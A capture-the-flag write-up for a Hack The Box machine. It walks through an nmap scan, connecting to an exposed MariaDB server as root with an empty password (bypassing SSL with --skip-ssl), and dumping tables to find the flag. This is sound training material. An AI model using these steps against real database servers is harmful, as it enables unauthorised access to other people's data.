---
tags:
  - Linux
  - MariaDB
  - Weak credentials
---

... is a very simple HTB machine which hosts an MariaDB service which is misconfigured to accept weak credentials.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this (after waiting longer than usual):
```bash
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 77
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, Speaks41ProtocolOld, SupportsCompression, Support41Auth, ConnectWithDatabase, SupportsTransactions, Speaks41ProtocolNew, InteractiveClient, FoundRows, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, ODBCClient, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: T3A.`x[>c[|~&<<V}613
|_  Auth Plugin Name: mysql_native_password
```
`nmap` was not able to fully determine the service and its version from the flag `-sV` (when omitting this flag `nmap` tells us that it is `mysql`, as that is what is *USUALLY* hosted on port 3306). 
Luckily, the `-sC` flag made `nmap` use the script `mysql-info`, which has determined the service to be `MariaDB` with the version `10.3.27`. MariaDB is basically (not fully) MySQL, as it is an offspring of MySQL by the original developers after Oracle Corp. acquired MySQL.

### Initial Exploitation
I have looked at the [official MariaDB docs](https://mariadb.com/docs/server/mariadb-quickstart-guides/basics-guide) for it's basic usage. The first command tells us how to initiate an connection:
```bash
mariadb -u root -p -h localhost
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: username, here root
# -p: password. docs say: "If no password is set, press [Enter]"
# -h: hostname
```

I have replaced the `localhost` with `$IP` as i am not trying to connect to myself. After a short wait, i receive this error message:
```bash
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```
Note that this does NOT say that the credentials were faulty! After googling this error message i stumbled upon [this](https://stackoverflow.com/questions/78677369/mariadb-11-also-mysql-cli-error-2026-hy000-tls-ssl-error-ssl-is-required) stack overflow question. Someone answered that SSL can be ignored using the flag `--skip-ssl`. The final command to connect would then look like this:
```bash
mariadb -u root -p --skip-ssl -h $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: username, here root
# -p: password. docs say: "If no password is set, press [Enter]"
# -h: hostname. here, the target IP
# --skip-ssl: do not use SSL
```

This worked and the connection was established!

As MariaDB uses the same syntax as MySQL, i issue the command `show databases;` to list all available databases. This is the response:
```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

To use one of these databases, we can issue the command `use <name>;`. To list all tables of this database we can use `show tables;`. To dump the content of a table, the SQL query `select * from <name>;` can be used. 
This workflow is visualized here, and can be viewed as the next steps of the command above:
```bash
MariaDB [(none)]> use htb;
Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.025 sec)

MariaDB [htb]> select * from users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.021 sec)
```
The flag is then found in the config table from the `htb` database.

### Summary

Below is a visualized summary of the exploitation steps used in this machine.

``` mermaid
graph LR
  A[MariaDB<br>service] -->|Weak<br>credentials| B[Database<br>access];
```